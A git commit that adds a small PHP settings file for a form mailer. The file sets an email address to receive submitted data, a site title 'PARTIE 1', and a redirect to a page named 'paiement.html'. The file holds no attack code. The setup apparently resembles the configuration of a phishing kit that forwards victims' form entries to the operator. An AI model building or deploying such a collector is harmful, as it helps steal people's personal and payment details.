5e3b3b16e34c656ea7b0cfeb0c26992faeb244c6
Ketura201078965 <bsrtimportexport@gmail.com>
2024-10-26 00:35:00 +0000

    Add files via upload

---
+++ settings.php
@@ -0,0 +1,22 @@
+<?php
+
+/* Settings
+---------------------*/
+$email_to = 'bsrtimportexport@yahoo.com'; // Email addresses to send data. Seperate email addresses with ','
+$site_title = 'PARTIE 1'; // Your website title
+$webmaster_name = "My Friend"; 
+
+// Your name
+
+$headerbar_color = "#313131"; 
+
+// Color of the headerbar in the email sent
+$form_type = ""; 
+
+// Type of form - default is Contact Form
+
+;
+
+$success_redirect = "paiement.html"; // Page to redirect to after submission of form.
+
+?>
